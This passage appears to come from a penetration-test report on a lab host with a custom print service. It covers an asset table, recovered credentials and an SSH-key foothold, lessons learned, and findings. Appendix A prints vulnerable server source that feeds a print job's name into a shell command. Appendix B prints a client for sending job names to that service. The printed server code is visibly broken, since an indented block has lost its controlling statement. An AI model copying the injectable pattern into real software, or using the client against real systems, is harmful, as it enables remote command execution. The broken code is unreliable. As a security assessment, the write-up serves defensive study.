| `/home/archivist/printer/logs/commands.log` | User-controlled log monitored by `paperwork-daemon` | LPE trigger                       |
| `/home/archivist/.ssh/authorized_keys`      | SSH authentication configuration                    | Used to obtain `archivist` access |
| `/etc/paperwork/admin_pins.conf`            | Protected administrative configuration              | Sensitive credential disclosure   |
| `/run/paperwork/mgmt.sock`                  | Privileged Unix domain management socket            | LPE attack surface                |
| `/usr/bin/paperwork-daemon`                 | Root-executed Python daemon                         | Privileged component              |

---
## 🛡️Sensitive Information

>During post-exploitation, sensitive authentication material was recovered through multiple attack paths. An attacker-controlled SSH public key was successfully written to the `archivist` user's `authorized_keys` file, enabling authenticated SSH access as that user.
>
>From the `archivist` context, the privileged `paperwork-daemon` disclosed the contents of `/etc/paperwork/admin_pins.conf` through an improperly controlled file descriptor transfer. The recovered administrative credential was subsequently used to authenticate as `root`.
>
>Sensitive credential values are intentionally redacted from the report.
---
## 🕷️Persistence Opportunities

>The assessment demonstrated that the compromised host contained multiple locations where unauthorized authentication material could potentially be introduced. During exploitation, an attacker-controlled SSH public key was written to `/home/archivist/.ssh/authorized_keys` as part of the privilege-escalation path.
>
>No additional persistence mechanisms were intentionally established beyond the artifacts required to validate the identified vulnerabilities.

---
# 📚 Lessons Learned>bannerColor:#23382B

## ✅ What Worked

- Performing service enumeration before focusing on individual attack vectors.
- Reviewing publicly accessible application resources to identify exposed functionality.
- Correlating the disclosed source code with the behavior observed on TCP/1515.
- Validating command injection through controlled out-of-band interaction before attempting interactive access.
- Performing structured local enumeration after obtaining the `lp` foothold.
- Investigating the printer service on TCP/9100 and identifying its exposed PJL file-system functionality.
- Reviewing privileged processes and Unix domain sockets from the `archivist` context.
- Analyzing the trust boundary between unprivileged users and the root-executed `paperwork-daemon`.
- Demonstrating the complete attack chain from unauthenticated access to root compromise.

---

## ❌ Mistakes

- Exposing internal application source code through a publicly accessible archive.
- Allowing attacker-controlled print-job data to reach a shell command.
- Exposing file-system operations through the printer service without adequate path restrictions.
- Allowing a low-privileged account to modify another user's SSH authentication configuration.
- Allowing a root service to trust a user-controlled log file as a security decision input.
- Exposing privileged file descriptors to an unprivileged client through `SCM_RIGHTS`.
- Running custom application logic with unnecessary root privileges.
- Failing to enforce a clear authorization boundary between privileged services and local users.
---
## 💡 Key Takeaways

- Publicly exposed source code can significantly reduce the effort required to identify vulnerabilities in custom services.
- Network-accessible custom services should be treated as part of the primary attack surface, even when they are not standard protocols.
- File-system operations exposed through printer or management protocols must enforce strict path validation and authorization.
- SSH authentication files belonging to other users must never be writable by lower-privileged service accounts.
- Privileged Unix domain sockets require explicit access controls and authorization checks.
- File descriptors referencing sensitive resources must never be transferred to untrusted clients.
- Root-executed services should be minimized and isolated using least-privilege principles.
- The assessment demonstrated the importance of chaining vulnerabilities rather than evaluating each weakness independently.
---
# 📎 Appendix 

## 📚Appendix A — Exposed LPD Service Source Code

>This appendix contains the source code recovered from the publicly accessible archive exposed through `/download/archive`. The code is included to provide technical evidence of the custom LPD-like service's implementation and to document the vulnerable processing flow identified during the assessment.
### server.py

```python
#!/usr/bin/env python3

import socket
import threading
import subprocess
import os

VALID_QUEUE = os.environ.get("LPD_QUEUE")

class LpdHandler(threading.Thread):

    def __init__(self, sock, addr):
        super().__init__()
        self.sock = sock
        self.addr = addr
        self.id = f"[lpd-{addr[1]}]"

    def run(self):
        try:
            data = self.sock.recv(1024)
            if not data: return
            
            command = data[0]
            
            if command == 2:
                self.handle_print_job(data)
            elif command in (3, 4):
                self.sock.send(b"Archive_Printer is ready and printing.\n")
                
        except Exception as e:
            print(f"{self.id} Error: {e}")
        finally:
            self.sock.close()

    def handle_print_job(self, data):
        queue = data[1:].decode().strip()
        
        if queue not in VALID_QUEUE:
            print(f"{self.id} Rejected: Invalid queue '{queue}'")
            self.sock.send(b'\x01') 
            return
        print(f"{self.id} Accepted job for queue: {queue}")
        while True:
            chunk = self.sock.recv(1024)
            if not chunk: break
            
            subcommand = chunk[0]
            self.sock.send(b'\x00') 
                parts = chunk[1:].decode(errors='ignore').split()
                if not parts: continue
                
                size = int(parts[0])
                content = b""
                while len(content) < size:
                    content += self.sock.recv(size - len(content) + 1)
                
                decoded_content = content.decode(errors='ignore')
                
                job_name = "Unknown"
                for line in decoded_content.split('\n'):
                    line = line.strip()
                    if line.startswith('J'):
                        job_name = line[1:]
                        break
                
                print(f"{self.id} Executing archive for: {job_name}")
                subprocess.Popen(f"echo 'Archive: {job_name}' >> /tmp/archive.log", shell=True)
                
                self.sock.send(b'\x00') 
                self.sock.send(b'\x00')
                while self.sock.recv(4096):
                    pass
                break

class LpdServer:

    def __init__(self, ip='0.0.0.0', port=1515):
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server.bind((ip, port))
        self.server.listen(100)
        print(f"[*] LPD Server listening on {port}")

    def run(self):
        while True:
            sock, addr = self.server.accept()
            LpdHandler(sock, addr).start()

if __name__ == "__main__":
    LpdServer(port=1515).run()
```
---
## 📚Appendix B — LPD Proof-of-Concept Client

>This appendix contains the Python proof-of-concept client developed to communicate with the custom LPD-like service on TCP/1515. The client was used during testing to construct the expected protocol messages, submit print-job metadata, and validate the effect of attacker-controlled input within the `job_name` field.
### pocTrue.py

```python
#!/usr/bin/env python3

import socket
import argparse
def recv_ack(sock):
    response = sock.recv(1)
    print(f"[<] Response: {response!r}")
    print(f"[<] HEX     : {response.hex()}")
    if response != b"\x00":
        raise RuntimeError(f"Server rejected request: {response!r}")
def main():
    parser = argparse.ArgumentParser(description="LPD test client for Archive_Printer")
    parser.add_argument("host")
    parser.add_argument("-p", "--port", type=int, default=1515)
    parser.add_argument("-q", "--queue", default="archive_intake")
    parser.add_argument("-j", "--job-name", default="test-job", help="Benign job name for testing")
    args = parser.parse_args()
    print(f"[*] Connecting to {args.host}:{args.port}")
    s = socket.create_connection((args.host, args.port), timeout=5)
    queue_packet = b"\x02" + args.queue.encode() + b" "
    print(f"[>] Queue packet: {queue_packet!r}")
    s.sendall(queue_packet)
    recv_ack(s)
    print(f"[+] Queue accepted: {args.queue}")
    control = (f"J{args.job_name}\n").encode()
    size = len(control)
    print(f"[*] Job name : {args.job_name}")
    print(f"[*] Size     : {size}")
    header = b"\x02" + str(size).encode() + b" control\n"
    print(f"[>] Sending control header: {header!r}")
    s.sendall(header)
    recv_ack(s)
    print("[+] Control header accepted")
    print(f"[>] Sending control content: {control!r}")
    s.sendall(control)
    try:
        recv_ack(s)
        print("[+] Control file accepted")
    except Exception as e:
        print(f"[!] No valid ACK: {e}")
    s.close()
    print("[+] Connection closed")
if __name__ == "__main__":
    main()
```

The PoC establishes a TCP connection to the custom LPD-like service, submits the target queue, constructs the print-job control data, and transmits the attacker-controlled `job_name` value used to validate the command-injection vulnerability.

---
# 📊 Findings Summary

| ID          | Severity        | Vulnerability                                                | Status    |
| ----------- | --------------- | ------------------------------------------------------------ | --------- |
| **WEB-002** | 🟡 **MEDIUM**   | Sensitive Source Code / Archive Exposure                     | Confirmed |
| **WEB-001** | 🟣 **CRITICAL** | Unauthenticated OS Command Injection / Remote Code Execution | Confirmed |
| **LPE-002** | 🔴 **HIGH**     | Arbitrary File Write via PJL Path Traversal                  | Confirmed |
| **LPE-001** | 🔴 **HIGH**     | Privileged File Descriptor Disclosure                        | Confirmed |

---


# 🧠 Methodology Summary


<p align="center">
  <img src="assets/Attacker%20Recon%20to%20Privilege-2026-08-16-174241.png" alt="Attacker Recon" width="250">
</p>